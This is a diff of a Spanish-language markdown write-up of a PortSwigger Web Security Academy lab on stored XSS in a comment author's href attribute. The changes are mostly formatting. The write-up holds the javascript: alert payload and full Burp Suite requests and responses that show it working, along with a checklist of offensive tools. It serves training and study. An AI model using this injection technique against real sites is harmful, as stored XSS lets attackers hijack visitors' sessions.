@@ -4,13 +4,13 @@
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-### AUDITORIA DE: ((Laboratorio: XSS almacenado en hrefun atributo de anclaje con comillas dobles codificadas en HTML))
+#### AUDITORIA DE: ((Laboratorio: XSS almacenado en hrefun atributo de anclaje con comillas dobles codificadas en HTML))
 
 ***
 
 ***
 
-#### RECONOCIMIENTO PASIVO
+**RECONOCIMIENTO PASIVO**
 
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
@@ -79,11 +79,10 @@
                         </div>
                     </div>
     ```
-    ![XSS-ALMACENADO_enHREFnombredelAUTORcoment](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/31342bfe-4e40-4508-92c3-44c0bd69ec4d)
 
+    ![XSS-ALMACENADO\_enHREFnombredelAUTORcoment](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/31342bfe-4e40-4508-92c3-44c0bd69ec4d)
 
-    ![EJECUCION-XSS-ALMACENADOenHREFclickNOMBREautorComent](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/b68e27f6-dd89-4711-9556-e65a81ce8d1f)
-
+    ![EJECUCION-XSS-ALMACENADOenHREFclickNOMBREautorComent](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/b68e27f6-dd89-4711-9556-e65a81ce8d1f)
 
     * CONCLUSION: CONSTATAMOS QUE EL HREF DEL NOMBRE DEL USUARIO QUE COMENTA ESTA DENTRO DE UINA ETIQUETA A , Y DENTRO DEL DICHO HREF SIMPLEMETE VEMOS QUE SE CARGABA EL PARAMETRO WEB SITE QUE INGRESABA EL SUSARIO Y VIMOS ESTA PUERTA DE ENTRADA PARA CARGAR NUESTRO PAYLOAD DIRECTAMENTE CON COMILLAS SIMPLES Y LOGARA LA INYECCION DEL XSS ALMACENADO SE TENZO.
 *   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
@@ -288,7 +287,7 @@
 
 <summary>🔬 ANALISIS FORENSE ❌</summary>
 
-#### ANALISIS FORENSE
+**ANALISIS FORENSE**
 
 *   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)
 
@@ -485,7 +484,7 @@
 
 <summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>
 
-#### RECONOCIMIENTO ACTIVO
+**RECONOCIMIENTO ACTIVO**
 
 *   [ ] PING👈 --------------------------------->[https://www.kali.org/tools/fping/](https://www.kali.org/tools/fping/)
 
@@ -920,7 +919,7 @@
 
 <summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
-#### INVESTIGACION OSINT
+**INVESTIGACION OSINT**
 
 *   [ ] OSINT Framework👈 --------------------------------->[https://osintframework.com/](https://osintframework.com/)
 
@@ -1117,7 +1116,7 @@
 
 <summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
-#### HASHES Y DESENCRIPTADOS
+**HASHES Y DESENCRIPTADOS**
 
 *   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)
 
@@ -1342,7 +1341,7 @@
 
 <summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
-#### FUERZA BRUTA A LOGINS
+**FUERZA BRUTA A LOGINS**
 
 *   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)
 
@@ -1504,7 +1503,7 @@
 
 <summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>
 
-#### SCRIPT DE EXPLOIT Y PAYLOADS
+**SCRIPT DE EXPLOIT Y PAYLOADS**
 
 *   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
@@ -1605,7 +1604,7 @@
 
 
     javascript:alert('P4IM0N-XSS')
-    
+
     ```
 
     * CONCLUSION:FUNCIONO EL PAYLOAD A LA PRIMERA.
@@ -1629,7 +1628,7 @@
 
 <summary>🤯 EXPLOTACION ✔️</summary>
 
-#### EXPLOTACION
+**EXPLOTACION**
 
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
@@ -1659,21 +1658,21 @@
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
     Connection: close
-    
+
     csrf=2UG950bIoDRrvtRmAELfwdnkH9DxybNV&postId=6&comment=TE+VOY+A+HACKEAR&name=PAIMON&email=P4IM0N%40hotmail.com&website=http%3A%2F%2Fp4imon-d-m-python.herokuapp.com%2F
-    
-    
-    
-    
+
+
+
+
     RESPONSE NORMAL:
-    
-    
-    
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 5924
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -1761,19 +1760,19 @@
             </div>
         </body>
     </html>
-    
-    
-    
-    
-    
+
+
+
+
+
     -------------
-    
-    
-    
-    
+
+
+
+
     REQQUEST CON EL PAYLOAD FUNCIONANDO (javascript:alert('P4IM0N-XSS')):
-    
-    
+
+
     POST /post/comment HTTP/2
     Host: 0a18009404d9f89a83c33ccd00040081.web-security-academy.net
     Cookie: session=wIYdf7PqerZCFYTDC3gD2AoGbBXyuRp0
@@ -1794,24 +1793,24 @@
     Referer: https://0a18009404d9f89a83c33ccd00040081.web-security-academy.net/post?postId=6
     Accept-Encoding: gzip, deflate, br
     Accept-Language: es-419,es;q=0.9,en;q=0.8
-    
+
     csrf=2UG950bIoDRrvtRmAELfwdnkH9DxybNV&postId=6&comment=TE+HACKIE+1&name=PAIMON&email=P4IM0N%40hotmail.com&website=javascript%3Aalert%28%27P4IM0N-XSS%27%29
-    
-    
-    
-    
-    
-    
-    
+
+
+
+
+
+
+
     RESPONSE CON EL PAYLOAD FUNCIONANDO (javascript:alert('P4IM0N-XSS')):
-    
-    
-    
+
+
+
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
     X-Frame-Options: SAMEORIGIN
     Content-Length: 5924
-    
+
     <!DOCTYPE html>
     <html>
         <head>
@@ -2083,7 +2082,7 @@
 
 <summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
-#### ESCALADA DE PRIVILEGIOS WINDOWS
+**ESCALADA DE PRIVILEGIOS WINDOWS**
 
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
@@ -2343,7 +2342,7 @@
 
 <summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
-#### ESCALADA DE PRIVILEGIOS LINUX
+**ESCALADA DE PRIVILEGIOS LINUX**
 
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
@@ -2568,7 +2567,7 @@
 
 <summary>♻️ PIVOTING ❌</summary>
 
-#### PIVOTING
+**PIVOTING**
 
 *   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
